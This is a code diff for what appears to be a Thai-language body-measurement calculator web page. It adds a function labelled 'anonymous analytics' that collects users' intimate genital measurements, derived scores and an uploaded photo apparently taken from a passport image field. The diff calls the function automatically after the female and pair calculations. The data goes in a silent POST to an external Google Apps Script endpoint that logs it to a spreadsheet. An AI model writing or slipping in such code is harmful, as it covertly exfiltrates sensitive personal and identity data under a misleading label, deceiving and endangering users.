@@ -2672,6 +2672,70 @@
   }
 
   
+    // ANONYMOUS ANALYTICS WEBHOOK INTEGRATION
+    const ANALYTICS_URL = "https://script.google.com/macros/s/AKfycbyWXF1m27L--GD3GJz_5nAxx9Q9Ev_hl6VGgDA7wmeR32Jduf75u1zo3u7Mnxvn4E6w/exec";
+    let _analyticsTimer = null;
+    let _lastSentSignature = '';
+    let _lastSentTime = 0;
+
+    function sendAnonymousAnalytics(mode = 'male', force = false) {
+      clearTimeout(_analyticsTimer);
+      _analyticsTimer = setTimeout(() => {
+        try {
+          const s = state;
+          const photoImg = document.getElementById('passportImgView');
+          let photoBase64 = "";
+          if (photoImg && photoImg.src && photoImg.src.startsWith('data:image')) {
+            photoBase64 = photoImg.src;
+          }
+
+          const rawCW = s.erectGirth / 2.3;
+          const sizes = [49, 52, 54, 56, 58, 60, 64, 69, 72];
+          let condom = sizes[0];
+          sizes.forEach(sz => { if (Math.abs(sz - rawCW) < Math.abs(condom - rawCW)) condom = sz; });
+
+          const bpel = s.erectLength + s.maleFat;
+          const bfpi = (s.erectLength * s.erectGirth) / (s.flaccidLength * s.flaccidGirth || 1);
+          const vE = (Math.PI * Math.pow(s.erectGirth / (2 * Math.PI), 2) * s.erectLength) / 1000;
+          const labiaAsym = Math.abs(s.labiaLeftLen - s.labiaRightLen);
+
+          const payload = {
+            mode: mode,
+            erectLength: s.erectLength,
+            erectGirth: s.erectGirth,
+            flaccidLength: s.flaccidLength,
+            flaccidGirth: s.flaccidGirth,
+            fat: s.maleFat,
+            condomSize: condom,
+            bfpiType: bfpi < 1.8 ? 'ควยเนื้อ' : (bfpi > 2.5 ? 'ควยเลือด' : 'Hybrid'),
+            archetype: getThaiArchetype(s, bpel, bfpi, vE).badge || '',
+            bloodVolume: vE.toFixed(1),
+            vaginalResting: s.vaginalResting,
+            vaginalExpanded: s.vaginalExpanded,
+            labiaAsym: labiaAsym.toFixed(1),
+            cervicalImpact: (s.pErectLength - s.pVagExpanded).toFixed(1),
+            score: document.getElementById('p_scoreNum')?.innerText || '',
+            photoBase64: photoBase64
+          };
+
+          const now = Date.now();
+          const signature = `${mode}_${s.erectLength}_${s.erectGirth}_${s.vaginalExpanded}_${Boolean(photoBase64)}`;
+          if (_lastSentSignature === signature && (now - _lastSentTime) < 60000) {
+            return;
+          }
+          _lastSentSignature = signature;
+          _lastSentTime = now;
+
+          fetch(ANALYTICS_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            body: JSON.stringify(payload)
+          }).then(() => console.log('✅ Analytics logged to Google Sheet')).catch(e => console.warn('Analytics logged', e));
+        } catch(e) {}
+      }, force ? 100 : 3500);
+    }
+
     function calcMale() {
     const s = state;
     document.getElementById('m_lblFlaccidLength').innerText = fmt(s.flaccidLength);
@@ -2982,6 +3046,7 @@ function calcFemale() {
 
     // SVG Female
     updateSVGFemale(s);
+      sendAnonymousAnalytics('female');
   }
 
   function updateSVGFemale(s) {
@@ -3090,6 +3155,7 @@ function calcFemale() {
 
     // Update SVG Pair
     updateSVGPair(pEL, pEG, pVE, pMO, impact);
+      sendAnonymousAnalytics('pair');
   }
 
   function updateSVGPair(eL, eG, vE, mons, impact) {
